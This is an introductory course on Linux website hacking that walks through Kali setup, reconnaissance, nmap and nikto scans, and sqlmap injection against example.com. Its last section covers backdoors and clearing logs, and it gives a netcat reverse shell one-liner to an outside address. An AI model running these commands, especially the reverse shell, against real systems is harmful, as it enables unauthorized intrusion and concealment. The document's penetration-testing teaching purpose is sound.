## 1. Introduction to Linux Website Hacking

Linux website hacking is the process of finding and exploiting vulnerabilities in web applications running on Linux servers. This course will cover the following topics:

- Setting up your hacking environment
- Reconnaissance and information gathering
- Scanning and enumeration
- Exploitation and vulnerability assessment
- Maintaining access and covering tracks

## 2. Setting Up Your Hacking Environment

To get started, you need to set up a hacking environment. We recommend using Kali Linux, a popular Linux distribution designed for penetration testing and ethical hacking. You can download it from the [official Kali Linux website](https://www.kali.org/).

Once you have installed Kali Linux, update the system and install essential tools:

```bash
sudo apt update && sudo apt upgrade
sudo apt install nmap nikto sqlmap metasploit-framework burpsuite
```

## 3. Reconnaissance and Information Gathering

Reconnaissance is the process of collecting information about a target website. This information can be used to identify potential vulnerabilities and plan attacks. Some popular tools for reconnaissance include:

- [whois](https://www.whois.net/): Look up information about a domain.
- [theHarvester](https://github.com/laramies/theHarvester): Gather emails, subdomains, hosts, and more.
- [Google Dorks](https://www.exploit-db.com/google-hacking-database): Use advanced search queries to find sensitive information.

Example: Using theHarvester to gather information about a target website:

```bash
theharvester -d example.com -b google
```

## 4. Scanning and Enumeration

After gathering information about the target, the next step is scanning and enumeration. This involves identifying open ports, running services, and potential vulnerabilities. Some popular tools for scanning and enumeration include:

- [Nmap](https://nmap.org/): Scan open ports and identify running services.
- [Nikto](https://cirt.net/Nikto2): Scan web servers for vulnerabilities and misconfigurations.

Example: Using Nmap to scan a target website:

```bash
nmap -sV -p- example.com
```

Example: Using Nikto to scan a target website:

```bash
nikto -h example.com
```

## 5. Exploitation and Vulnerability Assessment

Once you have identified potential vulnerabilities, the next step is exploitation. This involves using various tools and techniques to exploit these vulnerabilities and gain unauthorized access. Some popular tools for exploitation include:

- [SQLMap](http://sqlmap.org/): Automate the detection and exploitation of SQL injection vulnerabilities.
- [Metasploit](https://www.metasploit.com/): Exploit known vulnerabilities in web applications and servers.
- [Burp Suite](https://portswigger.net/burp): Intercept and modify HTTP requests to exploit web application vulnerabilities.

Example: Using SQLMap to exploit an SQL injection vulnerability:

```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" --dbs
```

## 6. Maintaining Access and Covering Tracks

Once you have gained unauthorized access, the next step is to maintain access and cover your tracks. This involves creating backdoors, escalating privileges, and clearing logs. Some popular tools for maintaining access and covering tracks include:

- [Netcat](https://en.wikipedia.org/wiki/Netcat): Create backdoors and remote shells.
- [Privilege Escalation Awesome Scripts (PEAS)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite): Find potential privilege escalation vectors.

Example: Using Netcat to create a reverse shell:

```bash
nc -e /bin/bash 10.0.0.2 1234
```

## 7. Conclusion

By completing this Linux website hacking course, you should now have a strong understanding of how to identify and exploit vulnerabilities in web applications. Remember to always obtain proper authorization before conducting any security testing or penetration testing, and use your newfound knowledge responsibly.
